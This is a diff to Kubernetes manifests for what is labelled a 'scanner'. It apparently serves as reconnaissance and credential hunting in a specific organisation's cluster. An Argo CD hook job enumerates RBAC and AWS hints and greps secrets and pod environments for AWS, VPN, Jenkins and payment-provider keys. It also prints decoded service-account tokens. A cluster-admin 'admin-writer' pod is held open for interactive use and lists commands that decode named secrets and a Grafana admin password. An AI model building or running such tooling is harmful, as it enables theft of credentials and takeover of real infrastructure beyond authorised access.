@@ -1,4 +1,3 @@
-
 apiVersion: v1
 kind: Namespace
 metadata:
@@ -33,9 +32,6 @@ metadata:
   labels:
     app.kubernetes.io/part-of: scanner
 rules:
-  - apiGroups: [""]
-    resources: ["*"]
-    verbs: ["get", "list", "watch"]
   - apiGroups: ["*"]
     resources: ["*"]
     verbs: ["get", "list", "watch"]
@@ -139,7 +135,7 @@ spec:
                 - |
                   set -e
                   kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{.spec.initContainers[*].image}{"\n"}{end}' | sort -u | grep -v '^$' > /tmp/images.txt || true
-                  while read img; do
+                  while IFS= read -r img; do
                     trivy image --quiet --severity HIGH,CRITICAL --no-progress "$img" || true
                   done < /tmp/images.txt
               resources:
@@ -161,9 +157,10 @@ metadata:
     app.kubernetes.io/component: job-reader
   annotations:
     argocd.argoproj.io/hook: PostSync
-    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation
+    argocd.argoproj.io/hook-delete-policy: HookSucceeded
 spec:
   backoffLimit: 0
+  ttlSecondsAfterFinished: 300
   template:
     metadata:
       labels:
@@ -171,6 +168,7 @@ spec:
         app.kubernetes.io/component: job-reader
     spec:
       serviceAccountName: scanner-sa
+      automountServiceAccountToken: true
       restartPolicy: Never
       containers:
         - name: reader
@@ -199,9 +197,13 @@ spec:
               kubectl api-resources --verbs=list --namespaced=false -o name 2>/dev/null | tr '\n' ' '; log ""
               log ""
 
-              log "=== 2. NODES ==="
+              log "=== 2. NODES + PROVIDER HINTS ==="
               kubectl get nodes -o wide
               kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.status.addresses[?(@.type=="InternalIP")].address}{" "}{.status.nodeInfo.kubeletVersion}{" "}{.status.nodeInfo.containerRuntimeVersion}{"\n"}{end}'
+              log "--- node labels (aws/eks/cloud hints) ---"
+              kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.labels}{"\n"}{end}'
+              log "--- storageclass (ebs/gp2/gp3/efs = AWS) ---"
+              kubectl get storageclass -o wide 2>/dev/null
               log ""
 
               log "=== 3. NAMESPACES + QUOTAS + LIMITS ==="
@@ -230,6 +232,8 @@ spec:
               log "=== 8. SERVICEACCOUNTS + TOKEN SECRETS ==="
               kubectl get sa -A
               kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token
+              log "--- SA annotations (IRSA / role-arn = AWS) ---"
+              kubectl get sa -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" "}{.metadata.annotations}{"\n"}{end}'
               log ""
 
               log "=== 9. RBAC: CLUSTERROLES (high-priv) ==="
@@ -250,45 +254,57 @@ spec:
               done
               log ""
 
-              log "=== 11. SECRETS INVENTORY (names only, no values) ==="
-              kubectl get secrets -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type,DATA:.data --no-headers | while read ns name type data; do
+              log "=== 11. SECRETS INVENTORY (names only) ==="
+              kubectl get secrets -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type --no-headers | while read ns name type; do
                 log "$ns/$name ($type)"
               done
               log ""
 
-              log "=== 12. SECRETS: HARBOR / REGISTRY / TLS / SSH / GIT CREDS ==="
-              kubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.type}{"\n"}{end}' | while read ns name type; do
-                case "$ns/$name" in
-                  *harbor*|*registry*|*repo-creds*|*tls*|*ssh*|*dockerconfigjson*|*argocd-secret*|*initial-admin*)
-                    log "--- $ns/$name ($type) ---"
-                    kubectl get secret -n "$ns" "$name" -o json 2>/dev/null | tr -d '\n' | cut -c1-400; log ""
-                    ;;
-                esac
+              log "=== 12. SECRETS KEYS (what's inside, no values) ==="
+              for ns in argocd beeaudit-dev beekids-test beewaf stockhive-test monitoring cert-manager ingress-nginx kube-system default; do
+                for s in $(kubectl -n "$ns" get secret -o name 2>/dev/null | cut -d/ -f2); do
+                  keys=$(kubectl -n "$ns" get secret "$s" -o jsonpath='{.data}' 2>/dev/null | grep -oE '"[a-zA-Z0-9._-]+":' | tr -d '":' | tr '\n' ',')
+                  [ -n "$keys" ] && log "$ns/$s -> $keys"
+                done
               done
               log ""
 
-              log "=== 13. SERVICEACCOUNT TOKENS (raw) ==="
+              log "=== 13. HUNT: AWS / VPN / RDP / JENKINS / GITLAB / PAYMENT KEYS ==="
+              for ns in argocd beeaudit-dev beekids-test beewaf stockhive-test monitoring; do
+                for s in $(kubectl -n "$ns" get secret -o name 2>/dev/null | cut -d/ -f2); do
+                  keys=$(kubectl -n "$ns" get secret "$s" -o jsonpath='{.data}' 2>/dev/null | grep -oE '"[a-zA-Z0-9._-]+":' | tr -d '":')
+                  hit=$(echo "$keys" | grep -iE 'aws|vpn|rdp|jenkins|gitlab|stripe|paymee|flouci|konnect|paypal|payment|ssh|private|token|password|secret|api[_-]?key' | tr '\n' ',')
+                  [ -n "$hit" ] && log "HIT $ns/$s -> $hit"
+                done
+              done
+              log ""
+
+              log "=== 14. POD ENV HUNT (aws/vpn/rdp/jenkins/payment) ==="
+              kubectl get pods -A -o json 2>/dev/null | grep -oE '"(AWS_[A-Z_]+|VPN_[A-Z_]+|RDP_[A-Z_]+|JENKINS_[A-Z_]+|GITLAB_[A-Z_]+|STRIPE_[A-Z_]+|PAYMEE_[A-Z_]+|FLOUCI_[A-Z_]+|KONNECT_[A-Z_]+|PAYPAL_[A-Z_]+|[A-Z_]*PAYMENT[A-Z_]*)"' | sort -u
+              log ""
+
+              log "=== 15. SERVICEACCOUNT TOKENS (raw, first 80 chars) ==="
               kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.data.token}{"\n"}{end}' | while read ns name token; do
                 log "--- $ns/$name ---"
                 echo "$token" | base64 -d 2>/dev/null | cut -c1-80; log ""
               done
               log ""
 
-              log "=== 14. CLUSTER ISSUER / CERTIFICATES ==="
+              log "=== 16. CLUSTER ISSUER / CERTIFICATES ==="
               kubectl get clusterissuer,issuer,certificate,certificaterequest -A 2>/dev/null
               log ""
 
-              log "=== 15. ARGO CD APPS + PROJECTS + REPOS ==="
+              log "=== 17. ARGO CD APPS + PROJECTS + REPOS ==="
               kubectl get applications.argoproj.io,appprojects.argoproj.io -n argocd -o wide 2>/dev/null
               kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repository -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.data.url}{"\n"}{end}' 2>/dev/null
               kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repo-creds -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.data.url}{"\n"}{end}' 2>/dev/null
               log ""
 
-              log "=== 16. ARGOCD INTERNAL SERVICES + ENDPOINTS ==="
+              log "=== 18. ARGOCD INTERNAL SERVICES + ENDPOINTS ==="
               kubectl get svc,endpoints -n argocd -o wide
               log ""
 
-              log "=== 17. EXTERNAL ACCESS SURFACE (what is exposed) ==="
+              log "=== 19. EXTERNAL ACCESS SURFACE ==="
               log "--- NodePorts ---"
               kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="NodePort")]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.spec.ports[*].nodePort}{"\n"}{end}'
               log "--- LoadBalancers ---"
@@ -299,39 +315,39 @@ spec:
               kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="ExternalName")]}{.metadata.namespace}{" "}{.metadata.name}{" -> "}{.spec.externalName}{"\n"}{end}'
               log ""
 
-              log "=== 18. POD SECURITY / PRIVILEGED / HOSTPATH ==="
+              log "=== 20. POD SECURITY / PRIVILEGED / HOSTPATH ==="
               kubectl get pods -A -o json | grep -i -E 'privileged|hostPath|hostNetwork|hostPID|hostIPC' | head -50
               log ""
 
-              log "=== 19. DIND / SCAN SERVICE ==="
+              log "=== 21. DIND / SCAN SERVICE ==="
               kubectl -n beeaudit-dev get deploy beewaf 2>/dev/null
               kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.spec.containers[*].name}{"\n"}{end}' 2>/dev/null | grep -i dind
               log ""
 
-              log "=== 20. CNI / DNS / KUBE-PROXY ==="
+              log "=== 22. CNI / DNS / KUBE-PROXY ==="
               kubectl get pods,ds -n kube-system -o wide | grep -i -E 'calico|cilium|flannel|weave|coredns|kube-proxy|multus'
               log ""
 
-              log "=== 21. EVENTS (recent) ==="
+              log "=== 23. EVENTS (recent) ==="
               kubectl get events -A --sort-by=.lastTimestamp 2>/dev/null | tail -40
               log ""
 
-              log "=== 22. CRONJOBS / SCHEDULED WRITE ACTIONS ==="
+              log "=== 24. CRONJOBS / SCHEDULED WRITE ACTIONS ==="
               kubectl get cronjobs -A -o wide
               log ""
 
-              log "=== 23. SELF SUBJECT ACCESS REVIEW ==="
+              log "=== 25. SELF SUBJECT ACCESS REVIEW ==="
               kubectl auth can-i --list 2>/dev/null | head -200
               log ""
 
-              log "=== 24. RAW: WRITE-CAPABLE CLUSTERROLES ==="
+              log "=== 26. RAW: WRITE-CAPABLE CLUSTERROLES ==="
               for cr in $(kubectl get clusterrole -o name 2>/dev/null | cut -d/ -f2); do
                 rules=$(kubectl get clusterrole "$cr" -o jsonpath='{.rules}' 2>/dev/null)
                 echo "$rules" | grep -q '"\*"' && echo "$cr"
               done
               log ""
 
-              log "=== 25. RECON SUMMARY ==="
+              log "=== 27. RECON SUMMARY ==="
               log "nodes: $(kubectl get nodes --no-headers 2>/dev/null | wc -l)"
               log "namespaces: $(kubectl get ns --no-headers 2>/dev/null | wc -l)"
               log "pods: $(kubectl get pods -A --no-headers 2>/dev/null | wc -l)"
@@ -341,6 +357,8 @@ spec:
               log "ingress: $(kubectl get ing -A --no-headers 2>/dev/null | wc -l)"
 
               log "=== DONE ==="
+              echo "--- holding pod alive 120s so Argo logs are readable ---"
+              sleep 120
               exit 0
           env:
             - name: POD_NAMESPACE
@@ -376,6 +394,7 @@ metadata:
     argocd.argoproj.io/hook: Skip
 spec:
   backoffLimit: 0
+  ttlSecondsAfterFinished: 600
   template:
     metadata:
       labels:
@@ -383,6 +402,7 @@ spec:
         app.kubernetes.io/component: admin-writer
     spec:
       serviceAccountName: scanner-writer
+      automountServiceAccountToken: true
       restartPolicy: Never
       containers:
         - name: writer
@@ -392,11 +412,17 @@ spec:
             - |
               set -e
               echo "=== ADMIN WRITER READY ==="
-              echo "serviceaccount: scanner-writer"
-              echo "run: kubectl ... (full cluster-admin)"
-              echo "this pod stays Running for interactive use"
-              echo "exec: kubectl -n scanner exec -it deploy/admin-writer -- sh"
-              sleep 3600
+              echo "serviceaccount: scanner-writer (cluster-admin)"
+              echo "exec: kubectl -n scanner exec -it job/admin-writer -- sh"
+              echo "this pod stays Running for 30 min"
+              echo ""
+              echo "handy commands once inside:"
+              echo "  kubectl get nodes -o wide"
+              echo "  kubectl get secrets -A"
+              echo "  kubectl -n beewaf get secret beewaf-secrets -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key)=\\(.value|@base64d)\"'"
+              echo "  kubectl -n beeaudit-dev get secret beeaudit-scan-service -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key)=\\(.value|@base64d)\"'"
+              echo "  kubectl -n monitoring get secret grafana-admin -o jsonpath='{.data.admin-password}' | base64 -d"
+              sleep 1800
           resources:
             requests:
               cpu: 50m
